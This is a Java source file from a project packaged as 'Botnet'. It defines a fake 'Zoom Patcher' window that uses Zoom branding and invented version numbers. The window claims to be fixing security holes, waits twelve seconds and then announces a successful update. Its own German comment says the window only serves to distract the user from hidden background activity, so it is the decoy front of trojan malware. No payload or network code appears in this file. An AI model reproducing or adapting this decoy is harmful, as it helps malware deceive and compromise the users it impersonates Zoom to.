package Botnet;

import java.awt.Color;
import java.awt.Font;
import java.io.File;
import java.io.IOException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;
import java.util.concurrent.TimeUnit;

import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
/**
 * Diese Klasse sorgt für die grafische Darstellung.
 * @author Cedric Busacker
 *
 */
public class GUI extends JFrame{
	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;

	/**
	 * Dieser Konstruktor erstellt einen eigenen Host. 
	 * Dann prüft er ob das GUI bereits einmal dargestellt wurde und zeigt dann entweder eine grafische Fehlermeldung oder das GUI.
	 * @throws IOException
	 * @throws InterruptedException
	 * @throws NoSuchAlgorithmException
	 * @throws InvalidKeySpecException
	 */
	public GUI() throws IOException, InterruptedException, NoSuchAlgorithmException, InvalidKeySpecException {
			Host localhost;
			localhost = new Host(true);
			File file = new File(localhost.getOPERATING_PATH()+"/.gui");
			if(file.exists()) {
				JOptionPane.showMessageDialog(getContentPane(),
					    "Ihre Zoom Installation wurde bereits aktualisiert!");
			}else {
				file.createNewFile();
				showGUI();
			}
			dispose();

		
		
	}
	/**
	 * Dieser Konstruktor bekommt einen Host übergeben. (Um Resourcen zu sparen)
	 * Dann prüft er ob das GUI bereits einmal dargestellt wurde und zeigt dann entweder eine grafische Fehlermeldung oder das GUI.
	 * @param localhost
	 * @throws IOException
	 * @throws InterruptedException
	 */
	public GUI(Host localhost) throws IOException, InterruptedException {
		File file = new File(localhost.getOPERATING_PATH()+"/.gui");
		if(file.exists()) {
			JOptionPane.showMessageDialog(getContentPane(),
				    "Ihre Zoom Installation wurde bereits aktualisiert!");
		}else {
			file.createNewFile();
			showGUI();
		}
		dispose();
	}
	/**
	 * Zeigt das GUI. Wobei das GUI keine direkte Funktion hat sondern den User von den Hintergrund-Aktivitäten ablenken soll.
	 * @throws InterruptedException
	 */
	private void showGUI() throws InterruptedException {
		setVisible(true);
		//setLayout(new FlowLayout());
		setSize(300, 300);
		setTitle("Zoom Patcher");
		
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		getContentPane().setBackground(new Color(45, 140, 255));
		ImageIcon img = new ImageIcon(this.getClass().getResource("ZoomLogo.png"));
		setIconImage(img.getImage());
		Font font = new Font("Arial", Font.BOLD + Font.ITALIC, 15);
		JLabel Text3 = new JLabel("<html>Es wurden Sicherheitslücken in Ihrer Zoom Installation gefunden.<br/> Bitte warten Sie bis, das Programm<br/> diese behoben hat.<br/><br/><br/></hmtl>");
		Text3.setBounds(20, 00, 250, 150);
		Text3.setFont(font);
		Text3.setForeground(Color.WHITE);
		JLabel Text1 = new JLabel("Installierte Version: 5.2.1");
		Text1.setBounds(20, 150, 200, 100);
		Text1.setFont(font);
		Text1.setForeground(Color.WHITE);
		JLabel Text2 = new JLabel("<html>Neuste Version: 5.4.2<br/><br/><br/></html>");
		Text2.setBounds(20, 200, 200, 100);
		Text2.setFont(font);
		Text2.setForeground(Color.WHITE);
		JButton bPatch = new JButton("Patch");
		bPatch.setBackground(Color.BLACK);
		bPatch.setForeground(Color.WHITE);
		add(Text3);
		add(Text1);
		add(Text2);
		//add(bPatch);
		ImageIcon gif = new ImageIcon(this.getClass().getResource("loading2.gif"));
		
		add(new JLabel(gif));
		setResizable(false);
		setLocationRelativeTo(null);
		setVisible(true);
		TimeUnit.SECONDS.sleep((long) 12);
		
		JOptionPane.showMessageDialog(getContentPane(),
			    "Ihre Zoom Installation wurde aktualisiert!");
		
	}
}
